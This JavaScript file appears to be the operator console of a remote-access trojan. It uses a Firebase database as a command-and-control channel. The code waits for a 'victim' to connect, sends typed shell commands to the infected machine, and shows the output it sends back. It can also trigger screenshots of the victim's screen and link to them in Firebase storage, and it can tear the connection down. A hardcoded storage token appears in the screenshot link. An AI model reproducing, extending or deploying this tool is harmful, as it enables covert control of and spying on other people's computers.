let t=document.getElementsByTagName("span");
function start(){
    print(cwd);
    print("",2)
  
}


function exec(cmdv) {
  console.log(cmdv)
  // ##### Access Procedure #####
  if(login==true){
    varify(cmdv);
    if(cmdv=="@y"){
      db.update({
        "req":0,
        "cmd":"started",
        "conn":"expired"})

      out.innerHTML=""
      print("waiting for victim...", 2)

      let c=setInterval(() => {
        // Listening for connections
        db.once('value', (a)=>{
          if(a.val().victim !=="unknown") {
            print(`Connected with ${a.val().victim}<br>`);
            window.clearInterval(c)
            login="done"
            user=true;
            cwd=a.val().output+">"
            start();
          }
        })
      }, 2000);
    }else if(cmdv=="@updt"){
      clean();

      db.once('value', (a)=>{
        print("conn-status: "+a.val().conn)
        print("output: "+a.val().output)
        print("victim: "+a.val().victim)
        print(a.val().process)
        print("* Make sure if you have set victim unknown: ")
        print("" , 2) //create input box
        // keylog=t[t.length-2]
      })
    }
    else if(cmdv=="@enter"){
      let c=setInterval(() => {
        // Listening for connections
        db.once('value', (a)=>{
          if(a.val().victim !=="unknown") {
            print(`Connected reestablished with ${a.val().victim}<br>`);
            req=a.val().req+1;
            window.clearInterval(c);
            login="done"
            user=true;
            cwd=a.val().output+">"
            start();
          }
        })
      }, 2000);
    }
    else{console.log("pass");}
  }
  

  // ##### Main Commandline handling ######
  if(cmdv.length>0 && user){
    if(sl.includes(cmdv)){
        self=false;
    }else{
      db.update({"cmd":cmdv})
      req+=1;
      db.update({"req":req})
      self=true;
    }

    // --- Log the output ---
    fetchout(cmdv);
    }
}

function fetchout(cmd) {
  let c=setTimeout(() => {
    db.once('value', (a)=>{
      let output=a.val().output;
      console.log("show output",self)
      if(cmd=="cmd-list"){
        cl.forEach(e => {
          print(e)
        });
      }else if(output.substring(0,3)=='cdt'){
        cwd=output.substring(4, output.length)+'>'
      }else if(cmd=='send ss'){ //Single quote must
        var tok;
        nums+=1;
        console.log(2222)
        self=false;
        delayStart=true;
        setTimeout(() => {
          db.once('value', (a)=>{
            tok=a.val().output;
            print(tok)
          })
          self=false;
          print(`<a data-title='screenshot${nums}' data-lightbox='mygallery' id='link' href='https://firebasestorage.googleapis.com/v0/b/progress-6b92a.appspot.com/o/files%2Fss${tok}.png?alt=media&token=e1df6e97-0ef3-44b4-8591-b750e255118e'>View Image</a>`)
        }, 3000);
        
      }else if(cmd=='db status'){
        print("<br>&ensp;########## Database ##########<br>")
        delayStart=true;
        db.once('value', (a)=>{
          print("cmd: "+a.val().cmd)
          print("conn-status: "+a.val().conn)
          print("output: "+a.val().output)
          print("req: "+a.val().req)
          print("victim: "+a.val().victim)
        })
        
      }else if(cmd=='quit-s'){
        db.update({"cmd":"quit-v"})
        print("Connection destroyed...");
        setTimeout(() => {
          reset();
          document.body.innerHTML="Connection closed!!!"
        }, 2000);
        
      }else if(cmd=='clear'){
        clean();
        print("<small>Console cleared!!!<small>")
      }else{
        // pass
      }
      console.log("show output",self)

      if(self==false){}else{
        print(output)
      }
      
      if(delayStart) {
        setTimeout(() => {
          start()
          delayStart=false;
        }, 3000);
      }else {
        start()
      }
    })
  }, 4000);
}

function clean() {
        document.getElementById("intro").style.display="none"
        document.querySelector(".div2").innerHTML="";
        let sole=document.createElement('span')
        sole.setAttribute("id","output")
        document.querySelector(".div2").appendChild(sole);
        document.querySelector(".div2").appendChild(cursor);
        
        out=sole;
}

function print(...output) {
  let out2=document.createElement('span')
  out2.setAttribute("style","font-size:1rem;")
  if(output[1]){
    out2.innerHTML=output[0];
  }else{
    // output[0].replaceAll(/\\n|\\r\\n|\\n\\r|\\r/g,"<br>")
    console.log(output[0])
    out2.innerHTML="<br>"+output;
  }
  out.appendChild(out2)
  keylog=t[t.length-4]
  
  window.scrollTo(0,20000);
}

function reset() {
  db.update({
    "victim":"unknown",
    "req":"reset",
    "cmd":"reset",
    "conn":"reset",
    "vicremd":"not yet",
    "output":"reset",
  })
}

function change(newK, root){
  keylog=newK;
  root.appendChild(cursor)
}

function login() {
    document.getElementById("token").innerHTML="Enter admin passkey: "
    let pass=document.getElementById("pass");
    change(pass, document.querySelector(".div2"));
    login=true;
}

function key() {
  document.addEventListener('keydown', (event) => {
    var name = event.key;
    // var code = event.code;
    window.clearInterval(i1);
    
    if(name=="Backspace"){
      keylog.innerHTML=keylog.innerText.substring(0,keylog.innerText.length-1);
    }else if(name=="Shift"){
      console.log(".");
    }else if(name=="Enter"){
      exec(keylog.innerHTML)
    }
    else{
      keylog.innerHTML=keylog.innerHTML+name;
    }
  }, false);
}

key();
login()